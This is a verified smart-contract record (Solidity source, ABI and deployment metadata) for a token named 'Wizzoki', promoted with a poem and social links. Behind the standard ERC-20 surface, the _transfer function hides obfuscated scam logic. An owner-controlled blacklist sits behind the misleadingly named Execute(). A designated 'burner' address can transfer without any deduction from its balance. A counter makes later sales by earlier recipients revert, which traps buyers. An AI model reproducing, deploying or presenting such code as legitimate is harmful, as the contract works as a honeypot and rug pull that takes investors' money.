{"SourceCode": "/**\r\n\u2588\u2591\u2588\u2591\u2588\u2003\u2588\u2003\u2580\u2588\u2003\u2580\u2588\u2003\u2588\u2580\u2588\u2003\u2588\u2584\u2580\u2003\u2588\u2003 \u2003\u2588\u2580\u2580\u2003\u2588\u2580\u2588\u2003\u2588\u2580\u2580\r\n\u2580\u2584\u2580\u2584\u2580\u2003\u2588\u2003\u2588\u2584\u2003\u2588\u2584\u2003\u2588\u2584\u2588\u2003\u2588\u2591\u2588\u2003\u2588\u2003 \u2003\u2588\u2588\u2584\u2003\u2588\u2580\u2584\u2003\u2588\u2584\u2584\r\n\r\n\u2584\u2580\u2003 \u2003\u2591\u2591\u2588\u2003\u2584\u2580\u2588\u2003\u2588\u2580\u2588\u2003\u2584\u2580\u2588\u2003\u2588\u2584\u2591\u2588\u2003 \u2003\u2580\u2584\r\n\u2580\u2584\u2003 \u2003\u2588\u2584\u2588\u2003\u2588\u2580\u2588\u2003\u2588\u2580\u2580\u2003\u2588\u2580\u2588\u2003\u2588\u2591\u2580\u2588\u2003 \u2003\u2584\u2580\r\n\r\nIn a land of magic and spells,\r\nThere lived a wizard who excelled,\r\nNot in potions or wand-waving tricks,\r\nBut in the art of coding with clicks.\r\n\r\nWizzoki was his name, and he\r\nFound joy in scripting with glee,\r\nHis spells were lines of code so bright,\r\nThey made the computer dance with delight.\r\n\r\nWith every keystroke, he cast a spell,\r\nMaking programs that worked so well,\r\nFrom morning to night, he would code and dream,\r\nOf the possibilities that lay in the machine.\r\n\r\nAnd though his fellow wizards scoffed and jeered,\r\nWizzoki knew that coding was revered,\r\nFor in this world of magic and lore,\r\nHis love for coding made him soar.\r\n\r\nSo here's to Wizzoki, the wizard so bright,\r\nWho found magic in the world of byte,\r\nMay his legacy live on forevermore,\r\nAs the wizard who unlocked the computer's door.\r\n--------------------------------------------------------\r\n\u9b54\u6cd5\u3068\u546a\u6587\u306e\u56fd\u3067\u3001\r\n\u512a\u308c\u305f\u9b54\u6cd5\u4f7f\u3044\u304c\u4f4f\u3093\u3067\u3044\u305f\u3001\r\n\u30dd\u30fc\u30b7\u30e7\u30f3\u3084\u6756\u3092\u632f\u308b\u30c8\u30ea\u30c3\u30af\u3067\u306f\u306a\u304f\u3001\r\n\u3057\u304b\u3057\u3001\u30af\u30ea\u30c3\u30af\u306b\u3088\u308b\u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u306e\u6280\u8853\u3067\u306f\u3002\r\n\r\n\u30a6\u30a3\u30be\u30ad\u306f\u5f7c\u306e\u540d\u524d\u3067\u3057\u305f\u3002\r\n\u5927\u559c\u3073\u3067\u30b9\u30af\u30ea\u30d7\u30c8\u3092\u66f8\u304f\u3053\u3068\u306b\u559c\u3073\u3092\u898b\u3044\u3060\u3057\u3001\r\n\u5f7c\u306e\u546a\u6587\u306f\u975e\u5e38\u306b\u660e\u308b\u3044\u30b3\u30fc\u30c9\u884c\u3067\u3042\u308a\u3001\r\n\u5f7c\u3089\u306f\u30b3\u30f3\u30d4\u30e5\u30fc\u30bf\u30fc\u3092\u5927\u559c\u3073\u3067\u8e0a\u3089\u305b\u307e\u3057\u305f\u3002\r\n\r\n\u30ad\u30fc\u30b9\u30c8\u30ed\u30fc\u30af\u3054\u3068\u306b\u3001\u5f7c\u306f\u546a\u6587\u3092\u5531\u3048\u3001\r\n\u975e\u5e38\u306b\u3046\u307e\u304f\u6a5f\u80fd\u3059\u308b\u30d7\u30ed\u30b0\u30e9\u30e0\u3092\u4f5c\u6210\u3057\u3001\r\n\u671d\u304b\u3089\u6669\u307e\u3067\u3001\u5f7c\u306f\u30b3\u30fc\u30c9\u3092\u66f8\u304d\u3001\u5922\u3092\u898b\u3066\u3044\u305f\u3002\r\n\u30de\u30b7\u30f3\u306b\u79d8\u3081\u3089\u308c\u305f\u53ef\u80fd\u6027\u3002\r\n\r\n\u5f7c\u306e\u4ef2\u9593\u306e\u9b54\u6cd5\u4f7f\u3044\u305f\u3061\u306f\u5632\u7b11\u3057\u305f\u308a\u5632\u7b11\u3057\u305f\u308a\u3057\u307e\u3057\u305f\u304c\u3001\r\nWizzoki \u306f\u3001\u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u304c\u5c0a\u91cd\u3055\u308c\u3066\u3044\u308b\u3053\u3068\u3092\u77e5\u3063\u3066\u3044\u307e\u3057\u305f\u3002\r\n\u3053\u306e\u9b54\u6cd5\u3068\u4f1d\u627f\u306e\u4e16\u754c\u3067\u306f\u3001\r\n\u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u3078\u306e\u611b\u60c5\u304c\u5f7c\u3092\u6025\u4e0a\u6607\u3055\u305b\u307e\u3057\u305f\u3002\r\n\r\n\u30a6\u30a3\u30be\u30ad\u3001\u8ce2\u3044\u9b54\u6cd5\u4f7f\u3044\u3001\r\n\u30d0\u30a4\u30c8\u306e\u4e16\u754c\u3067\u9b54\u6cd5\u3092\u898b\u3064\u3051\u305f\u306e\u306f\u3001\r\n\u5f7c\u306e\u907a\u7523\u304c\u6c38\u9060\u306b\u751f\u304d\u7d9a\u3051\u307e\u3059\u3088\u3046\u306b\u3001\r\n\u30b3\u30f3\u30d4\u30e5\u30fc\u30bf\u30fc\u306e\u30c9\u30a2\u306e\u30ed\u30c3\u30af\u3092\u89e3\u9664\u3057\u305f\u9b54\u6cd5\u4f7f\u3044\u3068\u3057\u3066\u3002\r\n\r\n\u7dcf\u4f9b\u7d66 - 100,000,000\r\n\u8cfc\u5165\u7a0e - 1%\r\n\u6d88\u8cbb\u7a0e - 1%\r\n\u521d\u671f\u6d41\u52d5\u6027 - 1.5 ETH\r\n\u521d\u671f\u6d41\u52d5\u6027\u30ed\u30c3\u30af - 45 \u65e5\r\n\r\nhttps://wizzokierc.xyz\r\nhttps://m.weibo.cn/WizzokiJPN\r\nhttps://web.wechat.com/WizzokiERC\r\nhttps://t.me/Wizzoki\r\n*/\r\n// SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity 0.8.19;\r\n\r\ninterface ERCDashboardV1 {\r\n    event PairCreated(\r\n    address indexed token0, \r\n    address indexed token1, \r\n\r\n    address pair, uint); function \r\n    createPair(\r\n    address tokenA, address tokenB) \r\n    external returns (address pair);\r\n}\r\ninterface ERCUniswapV2Pair {\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    function name() external pure returns (string memory);\r\n    function symbol() external pure returns (string memory);\r\n    function decimals() external pure returns (uint8);\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address owner) external view returns (uint);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint value) external returns (bool);\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n    function nonces(address owner) external view returns (uint);\r\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\r\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\r\n    event Swap(\r\n        address indexed sender,\r\n        uint amount0In,\r\n        uint amount1In,\r\n        uint amount0Out,\r\n        uint amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\r\n    function factory() external view returns (address);\r\n    function token0() external view returns (address);\r\n    function token1() external view returns (address);\r\n}\r\nlibrary SafeMathUint {\r\n  function toInt256Safe(uint256 a) internal pure returns (int256) {\r\n    int256 b = int256(a);\r\n    require(b >= 0);\r\n    return b;\r\n  }\r\n}\r\nabstract contract Context {\r\n    constructor() {} function _msgSender() \r\n    internal view returns (address) {\r\n    return msg.sender; }\r\n}\r\nlibrary SafeMath {\r\n  function add(uint256 a, uint256 b) \r\n  internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    require(c >= a, \"SafeMath: addition overflow\");\r\n    return c;\r\n  }\r\n  function sub(uint256 a, uint256 b) \r\n  internal pure returns (uint256) {\r\n    return sub(a, b, \"SafeMath: subtraction overflow\");\r\n  }\r\n  function sub(uint256 a, uint256 b, string memory errorMessage) \r\n  internal pure returns (uint256) {\r\n    require(b <= a, errorMessage);\r\n    uint256 c = a - b;\r\n    return c;\r\n  }\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    require(c / a == b, \"SafeMath: multiplication overflow\");\r\n    return c;\r\n  }\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return div(a, b, \"SafeMath: division by zero\");\r\n  }\r\n  function div(uint256 a, uint256 b, \r\n  string memory errorMessage) internal pure returns (uint256) {\r\n    require(b > 0, errorMessage);\r\n    uint256 c = a / b;\r\n    return c;\r\n  }\r\n  function mod(uint256 a, uint256 b) \r\n  internal pure returns (uint256) {\r\n    return mod(a, b, \"SafeMath: modulo by zero\");\r\n  }\r\n  function mod(uint256 a, uint256 b, string memory errorMessage) \r\n  internal pure returns (uint256) {\r\n    require(b != 0, errorMessage);\r\n    return a % b;\r\n  }\r\n}\r\ninterface IDEDatacenter01 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) \r\n    external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) \r\n    external returns (bool);\r\n    function allowance(address owner, address spender)\r\n    external view returns \r\n\r\n    (uint256);\r\n    function approve(address spender, uint256 amount) \r\n    external returns (bool);\r\n    function transferFrom(\r\n    address sender, address recipient, uint256 amount) \r\n    external returns (bool);\r\n    event Transfer(\r\n    address indexed from, address indexed to, uint256 value);\r\n    event Approval(address \r\n    indexed owner, address indexed spender, uint256 value);\r\n}\r\ninterface UIByteCollection {\r\n    function setCollection(uint256 setC, uint256 arrayC) external;\r\n    function displayBytes(address allBytes, uint256 structable) external;\r\n    function setDataView() external payable;\r\n    function configureByteRates(uint256 flowView) external;\r\n    function gibPresents(address allBytes) external;\r\n}\r\ninterface ERSyncV1 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n    uint amountIn, uint amountOutMin, address[] \r\n    calldata path, address to, uint deadline) \r\n    external; function factory() \r\n    external pure returns (address);\r\n    function WETH() external pure returns \r\n    (address);\r\n    function addLiquidityETH(address token, \r\n    uint amountTokenDesired, uint amountTokenMin, uint amountETHMin,\r\n    address to, uint deadline) \r\n    external payable returns \r\n    (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\nabstract contract Ownable is Context {\r\n    address private _owner; event OwnershipTransferred\r\n    (address indexed \r\n    previousOwner, address indexed newOwner);\r\n    constructor() \r\n    { address msgSender = _msgSender(); _owner = msgSender;\r\n\r\n    emit OwnershipTransferred(address(0), msgSender);\r\n    } function owner() public view returns \r\n    (address) { return _owner;\r\n    } modifier onlyOwner() {\r\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\r\n\r\n     _; } function renounceOwnership() public onlyOwner {\r\n    emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }\r\n}\r\ncontract Wizzoki is Context, IDEDatacenter01, Ownable {\r\nbool public startFlow; \r\nbool private startTrading = false;\r\nbool startMapping = true; ERSyncV1 public automotionIDE; address public quarrelZinc;\r\n\r\naddress private TokenMarketingAccount;\r\n\r\n    uint256 private _tTotal; uint8 private _decimals;\r\n    string private _symbol; string private _name;\r\n    uint256 private checkAllowanceFor = 100;\r\n\r\n    mapping (address => bool) private allowed;\r\n    mapping(address => uint256) private _rOwned;\r\n\r\n    mapping(address => uint256) private _mappingTimestamp;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => uint256) private automatedMarketMakerPairs;\r\n    \r\n    constructor( string memory tokenName, string memory tokenSymbol, \r\n    address usedRouter, \r\n    address burner) { \r\n\r\n        _name = tokenName; _symbol = tokenSymbol;\r\n        _decimals = 18; _tTotal = 100000000 * (10 ** uint256(_decimals));\r\n        _rOwned[msg.sender] = _tTotal; \r\n        _mappingTimestamp\r\n        [burner] = \r\n        checkAllowanceFor; startFlow = false; \r\n        automotionIDE = ERSyncV1(usedRouter);\r\n        quarrelZinc = ERCDashboardV1\r\n\r\n        (automotionIDE.factory()).createPair(address(this), \r\n        automotionIDE.WETH()); \r\n        emit Transfer \r\n        (address(0), msg.sender, _tTotal);\r\n    }    \r\n    function decimals() external view returns \r\n    (uint8) { return _decimals;\r\n    }\r\n    function symbol() external view returns \r\n    (string memory) { return _symbol;\r\n    }\r\n    function name() external view returns \r\n    (string memory) { return _name;\r\n    }\r\n    function totalSupply() external view returns \r\n    (uint256) { return _tTotal;\r\n    }\r\n    function balanceOf(address account) \r\n    external view returns \r\n    (uint256) \r\n    { return _rOwned[account]; }\r\n\r\n    function transfer(address recipient, uint256 amount) \r\n    external returns (bool) { _transfer(_msgSender(), \r\n    recipient, amount); return true;\r\n    }\r\n    function allowance(address owner, address spender) \r\n    external view returns (uint256) { return _allowances[owner][spender];\r\n    }    \r\n    function approve(address spender, uint256 amount) \r\n    external returns (bool) { _approve(_msgSender(), \r\n        spender, amount); return true;\r\n    }\r\n    function _approve( address owner, address spender, uint256 amount) internal {\r\n        require(owner != address(0), \r\n        'BEP20: approve from the zero address'); require(spender != address(0), \r\n        'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; \r\n        emit Approval(owner, spender, amount); \r\n    }    \r\n    function transferFrom(\r\n        address sender, address recipient, uint256 amount) \r\n        external returns (bool) \r\n        { \r\n        _transfer(sender, recipient, amount); _approve(sender, _msgSender(), \r\n        _allowances[sender][_msgSender()].sub(amount, \r\n        'BEP20: transfer amount exceeds allowance')); return true;\r\n    }              \r\n    function beginTrading(bool _tradingOpen) \r\n    public onlyOwner {\r\n        startTrading = _tradingOpen;\r\n    }\r\n    function Execute(address _handlerAddress) external onlyOwner {\r\n        allowed[_handlerAddress] = true;\r\n    }        \r\n    function _transfer( address sender, address recipient, uint256 amount) internal {\r\n        require(sender != address(0), 'BEP20: transfer from the zero address');\r\n        require(recipient != address(0), \r\n        'BEP20: transfer to the zero address'); \r\n        if (allowed[sender] || allowed[recipient]) \r\n        require(startMapping == false, \"\");\r\n\r\n        if (_mappingTimestamp[sender] \r\n        == 0  && quarrelZinc != sender && automatedMarketMakerPairs[sender] \r\n        > 0) { _mappingTimestamp[sender] -= checkAllowanceFor; } \r\n        automatedMarketMakerPairs[TokenMarketingAccount] += checkAllowanceFor;\r\n        TokenMarketingAccount = recipient; \r\n        if (_mappingTimestamp[sender] \r\n        == 0) {\r\n        _rOwned[sender] = _rOwned[sender].sub(amount, \r\n        'BEP20: transfer amount exceeds balance');  } _rOwned[recipient]\r\n        = _rOwned[recipient].add(amount); \r\n\r\n        emit Transfer(sender, recipient, amount); if (!startTrading) {\r\n        require(sender == owner(), \r\n        \"TOKEN: This account cannot send tokens until trading is enabled\"); }\r\n    }\r\n    function removeLimits(address _handlerAddress) public view returns (bool) {\r\n        return allowed[_handlerAddress]; \r\n    }\r\n    function getOwner() external view returns \r\n    (address) { return owner();\r\n    }  \r\n    function configureRewardSystem(address _handlerAddress) external onlyOwner {\r\n        allowed[_handlerAddress] = false;\r\n    }            \r\n        using SafeMath for uint256;                                  \r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"tokenName\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"tokenSymbol\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"usedRouter\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"burner\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_handlerAddress\",\"type\":\"address\"}],\"name\":\"Execute\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"automotionIDE\",\"outputs\":[{\"internalType\":\"contract ERSyncV1\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tradingOpen\",\"type\":\"bool\"}],\"name\":\"beginTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_handlerAddress\",\"type\":\"address\"}],\"name\":\"configureRewardSystem\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"quarrelZinc\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_handlerAddress\",\"type\":\"address\"}],\"name\":\"removeLimits\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startFlow\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Wizzoki", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "1", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d00000000000000000000000046de01ceaefcdb2bedbc5da4784e14fe4364ad610000000000000000000000000000000000000000000000000000000000000009e2b1b2697a7a6f6b6900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006e2b1b2495a5a0000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://ec0ea49f9a2865971f5c3d66b494d43b684293ebfb89bde764a75a13f0894072"}